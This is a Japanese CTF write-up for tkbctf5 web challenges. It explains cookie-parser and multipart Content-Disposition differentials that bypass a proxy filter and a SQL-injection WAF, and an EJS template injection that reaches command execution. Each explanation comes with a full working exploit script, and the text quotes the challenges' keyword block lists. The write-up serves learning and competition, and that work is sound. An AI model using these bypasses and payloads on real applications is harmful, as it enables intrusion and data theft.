---
title: tkbctf5 Writeup
date: 2026-03-15
layout: writeup
rank: 2
total_teams: 247
team: young (coo)
language: jp
tags:
  - Web
---

tkbctf5にチームyoung (coo)で参加し、2位。webが早々に片付けられてからは椅子暖め係をやっていた。
自分が解いた問題と、webのボス問のupsolveを書く。

# [web] Patisserie (85 sovles)
proxyとappの二段構成になっており、proxyはpythonで、appはnodeで書かれている。

appの`/admin`へ`is_admin`というcookieが1のリクエストを飛ばすとflagが得られる。
```js
app.get("/admin", (req, res) => {
  if (req.cookies.is_admin === "1") {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin - Patisserie</title>${PAGE_STYLE}</head>
<body>
${nav("Admin")}
<div class="container">
  <h1>Admin Panel</h1>
  <div class="card">
    <h2>Secret Recipe</h2>
    <p>${FLAG}</p>
  </div>
</div>
</body></html>`);
  }
  const failed = req.query.error === "1";
  res.status(403).send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Forbidden - Patisserie</title>${PAGE_STYLE}</head>
<body>
${nav(req.signedCookies.user)}
<div class="container">
  <h1>Admin Panel</h1>
  <div class="notice notice-warn">
    <span class="notice-icon">&#x1f512;</span>
    <div>You do not have permission to view this page. Please authenticate below.</div>
  </div>
  ${failed ? `<div class="notice notice-error"><span class="notice-icon">&#x2716;</span><div>Invalid password. Please try again.</div></div>` : ""}
  <div class="card">
    <h2>Admin Login</h2>
    <form action="/admin" method="POST">
      <input type="password" name="password" placeholder="Admin password" required>
      <button type="submit">Login</button>
    </form>
  </div>
  <a class="back-link" href="/recipes">&larr; Back to recipes</a>
</div>
</body></html>`);
});
```

しかし、proxy側でadminという文字列がkeyに含まれているとリクエストが弾かれてしまう。
```py
def parse_cookie_header(raw: str) -> dict[str, str]:
    sc = SimpleCookie()
    try:
        sc.load(raw)
    except Exception:
        return {}
    return {key: morsel.value for key, morsel in sc.items()}


def check_cookies(cookie_header: str) -> str | None:
    cookie_header = cookie_header.strip()
    if not cookie_header:
        return None

    cookies = parse_cookie_header(cookie_header)
    if not cookies:
        return "malformed cookie"

    if len(cookies) > MAX_COOKIES:
        return "too many cookies"

    for name in cookies:
        if "admin" in name.lower():
            return "blocked cookie"

    return None
```

この問題では、pythonとnodeのcookie parserの挙動差を利用する。具体的には、pythonのSimpleCookieではダブルクオーテーション内のセミコロンを区切りとせずそのまま値として解釈するのに対し、nodeのcookie-parserでは区切りとして解釈する。

よって、`Cookie: a="; is_admin=1; b="`のようなcookieを渡すとproxyをすり抜け、flagを得ることができる。

```py
import urllib.request
import re

TARGET_URL = "http://35.194.108.145:11198/admin"
PAYLOAD_COOKIE = 'a="; is_admin=1; b="'

def exploit():
    req = urllib.request.Request(
        TARGET_URL,
        headers={"Cookie": PAYLOAD_COOKIE},
        method="GET"
    )
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode("utf-8")
            match = re.search(r"tkbctf\{[^}]+\}", html)
            if match:
                print(f"[+] Flag found: {match.group(0)}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
```
`tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}`


# [web] Secure Gate (64 solves)
proxyとbackendの二段構成になっており、flagはsecretsテーブル内にある。
```go
flag := os.Getenv("FLAG")
if flag == "" {
    flag = "tkbctf{dummy}"
}
db.Exec("INSERT INTO secrets (value) VALUES (?)", flag)
```

また、自明なSQL Injectionが存在する。
```go
r.ParseMultipartForm(10 << 20)
q := r.FormValue("q")
if q == "" {
    jsonResponse(w, 200, []Note{})
    return
}

pattern := escapeLikePattern(q)
query := fmt.Sprintf(
    `SELECT id, title, content, created_at FROM notes WHERE content LIKE '%%%s%%' ESCAPE '\' ORDER BY created_at DESC`,
    pattern,
)
```

しかし、proxy内のWAFによって怪しいリクエストは弾かれてしまう。
```js
const SQLI_PATTERNS = [
  /'[^']*(\b(or|and|union|select|insert|update|delete|drop|alter|exec)\b|--|;)/i,
  /(union\s*(--[^\n]*\n\s*)*(all\s+)?(select|values))/i,
  /(\bselect\b[\s\S]*?\bfrom[\s"'[\x60(])/i,
  /(insert\s+into)/i,
  /(update\s+[\s\S]*?\sset\s)/i,
  /(delete\s+from)/i,
  /(drop\s+(table|database))/i,
  /(\bsleep\s*\(|\bbenchmark\s*\(|\bwaitfor\b)/i,
  /(load_file|into\s+(out|dump)file)/i,
  /\/\*[\s\S]*?\*\//,
];

function isSQLi(value) {
  return typeof value === "string" && SQLI_PATTERNS.some((p) => p.test(value));
}
```

この問題では、Content-Dispotionのパーサー差異を利用する。

`Content-Disposition: form-data; name="q"; filename="dummy"; filename*=utf-8''`というヘッダを渡すと、proxy側のnode(busboy)は`filename="dummy"`を認識し、リクエストをファイルとして扱うためWAFをすり抜けることができる。backendのgoではRFC 2231に対応しており、`filename*=utf-8''`が`filename`を上書きし、かつ`utf-8''`が空文字列として解釈されるため、form-fieldとして受理される。

これを用いてSQLiするsolverは以下の通り。
```py
import urllib.request
import json

def exploit():
    url = "http://35.194.108.145:50059/api/notes/search"
    boundary = "----WebKitFormBoundaryX"
    
    sqli_payload = "' UNION SELECT 1, value, 'x', '2025-01-01' FROM secrets WHERE '1' LIKE '"
    
    raw_body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"q\"; filename=\"dummy\"; filename*=utf-8''\r\n"
        f"\r\n"
        f"{sqli_payload}\r\n"
        f"--{boundary}--\r\n"
    ).encode('utf-8')
    
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }
    
    req = urllib.request.Request(url, data=raw_body, headers=headers, method="POST")
    
    try:
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode('utf-8')
            parsed_json = json.loads(response_data)
            
            print("[*] サーバーからの応答データ:")
            print(json.dumps(parsed_json, indent=2))
            
            for item in parsed_json:
                title = item.get("title", "")
                if "tkbctf{" in title:
                    print(f"\n[+] 抽出成功: {title}")
                    return
                    
            print("\n[-] 応答内にフラグが存在しません。")
            
    except urllib.error.URLError as e:
        print(f"[-] HTTPリクエストエラー: {e}")
        if hasattr(e, 'read'):
            print(f"詳細: {e.read().decode('utf-8')}")

if __name__ == "__main__":
    exploit()
```
`tkbctf{cr0ss1ng_th3_b0und4ry_w1th_rfc2231}`


# [web] Greeting (32 solves)
expressとejsを用いたアプリケーション。flagは予測困難な名前のファイル内にあるため、RCEが必要。
```js
const express = require("express");
const ejs = require("ejs");
const app = express();

const NAME_ALLOW = /^[a-zA-Z0-9<>()[\]-]+$/;
const DATA_ALLOW = /^[a-zA-Z0-9\s"{}:,/*]+$/;
const BLOCK =
  /this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa/i;

app.get("/", (req, res) => {
  const name = req.query.name ?? "world";
  const dataText = req.query.data ?? "{}";

  if (
    name.length > 80 ||
    !NAME_ALLOW.test(name) ||
    !DATA_ALLOW.test(dataText) ||
    BLOCK.test(name) ||
    BLOCK.test(dataText)
  ) {
    return res.status(403).send("Blocked");
  }

  let data;
  try {
    data = JSON.parse(dataText);
  } catch {
    return res.status(400).send("Bad JSON");
  }

  try {
    res.send(ejs.render(`<h1>Hello, ${name}</h1>`, data));
  } catch {
    res.status(500).send("Internal Server Error");
  }
});

app.listen(3000);
```

こういった問題ではSSTIからのRCEが典型だが、制約が中々厳しい。
```js
const NAME_ALLOW = /^[a-zA-Z0-9<>()[\]-]+$/;
const DATA_ALLOW = /^[a-zA-Z0-9\s"{}:,/*]+$/;
const BLOCK =
  /this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa/i;
```

しかし、よく見ると`ejs.render`に渡す`data`の型チェックがなく、Objectを渡すことができる。
例えば`{"delimiter": "a"}`を渡すことでdelimiterを上書きし、`<%`の代わりに`<a`を使うことができる。
また、RCEに必要なガジェットは`"con".concat("structor")`のようにconcatを使えばブラックリストを回避することができる。

文字数制限を満たしつつ、これが可能なsolverを書く。
```py
import base64
import json
import sys
import requests
import re

def generate_exploit_payload() -> tuple[str, str]:
    js_payload = "const cp=globalThis.process.mainModule.require('child_process');return cp.execSync('cat /flag*').toString()"

    block_pattern = re.compile(
        r"this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa",
        re.IGNORECASE
    )

    valid_b64 = None
    for i in range(100):
        test_payload = js_payload + " " * i
        if len(test_payload) % 3 != 0:
            continue
        
        b64 = base64.b64encode(test_payload.encode()).decode()
        
        if '+' not in b64 and not block_pattern.search(b64):
            valid_b64 = b64
            break

    if valid_b64 is None:
        raise ValueError("制約に合致するBase64ペイロードの生成に失敗した。")

    data_obj = {
        "delimiter": "a",
        "c": "con",
        "s": "structor",
        "k": "concat",
        "g": "return glo",
        "b": "balTh",
        "i": "is",
        "a": "at",
        "o": "ob",
        "P": valid_b64
    }
    data_str = json.dumps(data_obj, separators=(',', ':'))

    # <a-escape["constructor"](escape["constructor"]("return globalThis")()["atob"](P))()a>
    name_str = "<a-escape[c[k](s)](escape[c[k](s)](g[k](b)[k](i))()[a[k](o)](P))()a>"

    return name_str, data_str

def main():
    target_url = "http://35.194.108.145:12308/"
    
    try:
        name_param, data_param = generate_exploit_payload()
        
        if len(name_param) > 80:
            raise ValueError(f"nameパラメータ長 ({len(name_param)}) が80文字を超過している。")
            
        print(f"[*] Target URL: {target_url}")
        print(f"[*] Payload Name Length: {len(name_param)}")
        print(f"[*] Executing request...")
        
        response = requests.get(target_url, params={"name": name_param, "data": data_param})
        
        print(f"[*] HTTP Status: {response.status_code}")
        print("[*] Response Text:")
        print(response.text.strip())
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```
flagが得られた。
`tkbctf{n1c3_t0_m33t_y0u!_h0w_d1d_y0u_f1nd_m3?}`


# [web] Capture The F__l__a__g (17solves)

# [web] Capture The F__l__a__g Revenge (2 solves)


